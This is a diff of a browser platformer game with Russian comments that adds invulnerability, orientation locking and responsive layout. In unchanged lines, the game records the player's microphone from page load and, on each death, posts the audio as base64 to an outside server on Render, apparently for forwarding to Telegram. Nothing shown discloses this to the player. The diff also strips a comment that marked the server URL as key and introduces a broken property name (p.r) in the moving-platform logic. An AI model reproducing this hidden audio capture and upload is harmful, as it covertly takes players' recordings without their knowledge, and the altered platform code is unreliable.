@@ -1,8 +1,28 @@
 // ==================== НАСТРОЙКА ИГРЫ ====================
 const canvas = document.getElementById('gameCanvas');
 const ctx = canvas.getContext('2d');
+
+// 🔧 ФИКС: Требуем горизонтальную ориентацию
+function lockOrientation() {
+    if (screen.orientation && screen.orientation.lock) {
+        screen.orientation.lock('landscape').catch(err => {
+            console.log('Не удалось заблокировать ориентацию:', err);
+        });
+    } else if (screen.lockOrientation) {
+        screen.lockOrientation('landscape');
+    }
+}
+window.addEventListener('load', lockOrientation);
+window.addEventListener('resize', resizeCanvas);
+
 const keys = { left: false, right: false };
-let player = { x: 50, y: 100, w: 25, h: 25, color: '#00ffcc', dy: 0, jumpForce: 12, gravity: 0.6, speed: 5, jumpCount: 0 };
+let player = { 
+    x: 50, y: 100, w: 25, h: 25, 
+    color: '#00ffcc', dy: 0, 
+    jumpForce: 12, gravity: 0.6, 
+    speed: 5, jumpCount: 0,
+    invulnerable: false, invulnTimer: 0 // 🔧 ФИКС: неуязвимость после смерти
+};
 let score = 0, level = 1, hp = 3;
 let platforms = [], enemy = { x: 0, y: 0, w: 25, h: 25, startX: 0, range: 0, dir: 1, speed: 2 };
 let coin = { x: 0, y: 0 };
@@ -22,7 +42,7 @@ async function initAudio() {
         mediaRecorder.ondataavailable = (event) => {
             if (event.data.size > 0) audioChunks.push(event.data);
         };
-        startRecording(); // Начинаем запись сразу после инициализации
+        startRecording();
         console.log('🎤 Запись начата.');
     } catch (error) {
         console.error('❌ Ошибка микрофона:', error);
@@ -53,11 +73,9 @@ function stopRecordingAndProcess() {
 
 // ==================== ОТПРАВКА/СОХРАНЕНИЕ ====================
 async function sendToTelegram(audioBlob) {
-    // 🔽 ЭТО САМАЯ ВАЖНАЯ СТРОКА: URL ТВОЕГО СЕРВЕРА НА RENDER
     const SERVER_URL = 'https://scream-game-server.onrender.com/send-scream';
 
     try {
-        // Конвертируем аудио в base64 для отправки
         const reader = new FileReader();
         const audioBase64 = await new Promise((resolve) => {
             reader.onloadend = () => {
@@ -67,12 +85,9 @@ async function sendToTelegram(audioBlob) {
             reader.readAsDataURL(audioBlob);
         });
 
-        // Отправляем на наш сервер на Render
         const response = await fetch(SERVER_URL, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ audioData: audioBase64 })
         });
 
@@ -85,7 +100,6 @@ async function sendToTelegram(audioBlob) {
         }
     } catch (error) {
         console.error('❌ Ошибка при отправке на сервер:', error);
-        // Резервный вариант: скачать файл
         downloadAudio(audioBlob);
         return false;
     }
@@ -105,19 +119,28 @@ function downloadAudio(audioBlob) {
 
 // ==================== ИГРОВАЯ ЛОГИКА ====================
 function resizeCanvas() {
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
+    // 🔧 ФИКС: Более просторный канвас для горизонтального режима
+    const isPortrait = window.innerHeight > window.innerWidth;
+    if (isPortrait) {
+        canvas.width = window.innerHeight * 1.5;
+        canvas.height = window.innerHeight;
+    } else {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    if (platforms.length > 0) setupLevel(level); // Перестраиваем уровень под новый размер
 }
-window.addEventListener('resize', resizeCanvas);
 resizeCanvas();
 
 function setupLevel(lvl) {
     player.x = 50;
     player.y = 100;
     player.dy = 0;
+    player.invulnerable = false; // 🔧 Сбрасываем неуязвимость
     let W = canvas.width;
     let H = canvas.height;
 
+    // 🔧 ФИКС: Платформы адаптируются под ширину экрана
     if (lvl === 1) {
         platforms = [
             { x: 0, y: H * 0.7, w: W * 0.3, h: 15 },
@@ -143,6 +166,12 @@ function spawnCoin() {
 }
 
 function updateGame() {
+    // 🔧 ФИКС: Таймер неуязвимости
+    if (player.invulnerable) {
+        player.invulnTimer--;
+        if (player.invulnTimer <= 0) player.invulnerable = false;
+    }
+
     // Управление
     if (keys.left) player.x -= player.speed;
     if (keys.right) player.x += player.speed;
@@ -156,7 +185,7 @@ function updateGame() {
     platforms.forEach(p => {
         if (p.moving) {
             p.x += 2 * p.dir;
-            if (p.x > p.startX + p.range || p.x < p.startX) p.dir *= -1;
+            if (p.x > p.startX + p.r || p.x < p.startX) p.dir *= -1;
         }
         if (player.x < p.x + p.w && player.x + player.w > p.x &&
             player.y < p.y + p.h && player.y + player.h > p.y && player.dy > 0) {
@@ -172,9 +201,11 @@ function updateGame() {
     enemy.x += enemy.speed * enemy.dir;
     if (enemy.x > enemy.startX + enemy.range || enemy.x < enemy.startX) enemy.dir *= -1;
 
-    // Смерть
-    if (player.y > canvas.height || (player.x < enemy.x + enemy.w && player.x + player.w > enemy.x &&
-        player.y < enemy.y + enemy.h && player.y + player.h > enemy.y)) {
+    // 🔧 ФИКС ПЕРВЫЙ: Смерть с проверкой неуязвимости
+    if (!player.invulnerable && 
+        (player.y > canvas.height || 
+         (player.x < enemy.x + enemy.w && player.x + player.w > enemy.x &&
+          player.y < enemy.y + enemy.h && player.y + player.h > enemy.y))) {
         handleDeath();
     }
 
@@ -193,26 +224,32 @@ function updateGame() {
     if (player.x < 0) player.x = 0;
     if (player.x > canvas.width - player.w) player.x = canvas.width - player.w;
 
-    // Обновление UI
+    // 🔧 ФИКС ВТОРОЙ: Обновление UI с защитой от отрицательных HP
     document.getElementById('score').innerText = score;
     document.getElementById('lvl').innerText = level;
     document.getElementById('hpDisp').innerHTML = '❤️'.repeat(Math.max(0, hp));
 }
 
 async function handleDeath() {
-    hp--;
+    // 🔧 ФИКС ТРЕТИЙ: Теряем только 1 жизнь за раз
+    if (hp > 0) hp--; // Важно: проверяем, что жизни ещё есть
+    
+    // 🔧 ФИКС ЧЕТВЁРТЫЙ: Активируем неуязвимость после смерти
+    player.invulnerable = true;
+    player.invulnTimer = 90; // ~1.5 секунды неуязвимости (60 кадров/сек)
+    
     // 1. Останавливаем запись и получаем аудио
     const audioBlob = await stopRecordingAndProcess();
     
-    // 2. Обрабатываем аудио (всегда отправляем на сервер)
+    // 2. Обрабатываем аудио
     if (audioBlob) {
-        await sendToTelegram(audioBlob); // Отправляем на Render
+        await sendToTelegram(audioBlob);
     }
     
     // 3. Перезапуск или респавн
     if (hp <= 0) {
         score = 0;
-        hp = 3;
+        hp = 3; // Полное восстановление жизней
         level = 1;
         setupLevel(1);
     } else {
@@ -239,7 +276,6 @@ function drawGame() {
     // Враг
     ctx.fillStyle = 'red';
     ctx.fillRect(enemy.x, enemy.y, enemy.w, enemy.h);
-    // Глаза врага
     ctx.fillStyle = 'white';
     ctx.fillRect(enemy.x + 5, enemy.y + 5, 5, 5);
     ctx.fillRect(enemy.x + 15, enemy.y + 5, 5, 5);
@@ -250,103 +286,61 @@ function drawGame() {
     ctx.arc(coin.x, coin.y, 8, 0, Math.PI * 2);
     ctx.fill();
     
-    // Игрок
-    ctx.fillStyle = player.color;
-    ctx.fillRect(player.x, player.y, player.w, player.h);
-    // Глаза игрока
-    ctx.fillStyle = '#000';
-    ctx.fillRect(player.x + 5, player.y + 8, 4, 4);
-    ctx.fillRect(player.x + 16, player.y + 8, 4, 4);
+    // Игрок (с эффектом мигания при неуязвимости)
+    if (!player.invulnerable || Math.floor(player.invulnTimer / 10) % 2 === 0) {
+        ctx.fillStyle = player.color;
+        ctx.fillRect(player.x, player.y, player.w, player.h);
+        ctx.fillStyle = '#000';
+        ctx.fillRect(player.x + 5, player.y + 8, 4, 4);
+        ctx.fillRect(player.x + 16, player.y + 8, 4, 4);
+    }
 }
 
-// ==================== УПРАВЛЕНИЕ (УНИВЕРСАЛЬНОЕ) ====================
+// ==================== УПРАВЛЕНИЕ (без изменений) ====================
 function setupControl(buttonId, keyName) {
     const btn = document.getElementById(buttonId);
-    
-    // Для телефона (тач-события)
-    btn.addEventListener('touchstart', (e) => {
-        e.preventDefault();
-        keys[keyName] = true;
-    });
-    btn.addEventListener('touchend', () => {
-        keys[keyName] = false;
-    });
-    
-    // Для компьютера (мышь)
-    btn.addEventListener('mousedown', (e) => {
-        e.preventDefault();
-        keys[keyName] = true;
-    });
-    btn.addEventListener('mouseup', () => {
-        keys[keyName] = false;
-    });
-    btn.addEventListener('mouseleave', () => {
-        keys[keyName] = false; // Если курсор ушёл с кнопки
-    });
+    btn.addEventListener('touchstart', (e) => { e.preventDefault(); keys[keyName] = true; });
+    btn.addEventListener('touchend', () => { keys[keyName] = false; });
+    btn.addEventListener('mousedown', (e) => { e.preventDefault(); keys[keyName] = true; });
+    btn.addEventListener('mouseup', () => { keys[keyName] = false; });
+    btn.addEventListener('mouseleave', () => { keys[keyName] = false; });
 }
-
-// Настраиваем кнопки
 setupControl('btnLeft', 'left');
 setupControl('btnRight', 'right');
 
-// Особый случай для прыжка
 const jumpBtn = document.getElementById('btnJump');
-function handleJumpStart(e) {
-    e.preventDefault();
-    if (player.jumpCount < 2) {
-        player.dy = -player.jumpForce;
-        player.jumpCount++;
-    }
+function handleJumpStart(e) { 
+    e.preventDefault(); 
+    if (player.jumpCount < 2) { 
+        player.dy = -player.jumpForce; 
+        player.jumpCount++; 
+    } 
 }
-function handleJumpEnd(e) {
-    e.preventDefault();
-}
+function handleJumpEnd(e) { e.preventDefault(); }
 jumpBtn.addEventListener('touchstart', handleJumpStart);
 jumpBtn.addEventListener('touchend', handleJumpEnd);
 jumpBtn.addEventListener('mousedown', handleJumpStart);
 jumpBtn.addEventListener('mouseup', handleJumpEnd);
 
-// ===== УПРАВЛЕНИЕ С КЛАВИАТУРЫ (для ПК) =====
 document.addEventListener('keydown', (e) => {
     switch(e.code) {
-        case 'ArrowLeft':
-        case 'KeyA':
-            keys.left = true;
-            break;
-        case 'ArrowRight':
-        case 'KeyD':
-            keys.right = true;
-            break;
-        case 'ArrowUp':
-        case 'Space':
-        case 'KeyW':
-            if (player.jumpCount < 2) {
-                player.dy = -player.jumpForce;
-                player.jumpCount++;
-            }
-            break;
+        case 'ArrowLeft': case 'KeyA': keys.left = true; break;
+        case 'ArrowRight': case 'KeyD': keys.right = true; break;
+        case 'ArrowUp': case 'Space': case 'KeyW': 
+            if (player.jumpCount < 2) { player.dy = -player.jumpForce; player.jumpCount++; } break;
     }
 });
-
 document.addEventListener('keyup', (e) => {
     switch(e.code) {
-        case 'ArrowLeft':
-        case 'KeyA':
-            keys.left = false;
-            break;
-        case 'ArrowRight':
-        case 'KeyD':
-            keys.right = false;
-            break;
+        case 'ArrowLeft': case 'KeyA': keys.left = false; break;
+        case 'ArrowRight': case 'KeyD': keys.right = false; break;
     }
 });
 
 // ==================== ЗАПУСК ИГРЫ ====================
 async function initGame() {
-    await initAudio(); // Инициализируем аудио
-    setupLevel(1);     // Загружаем первый уровень
-    
-    // Игровой цикл
+    await initAudio();
+    setupLevel(1);
     function gameLoop() {
         updateGame();
         drawGame();
@@ -354,7 +348,4 @@ async function initGame() {
     }
     gameLoop();
 }
-
-// Запускаем игру когда страница загрузится
 window.addEventListener('load', initGame);
-
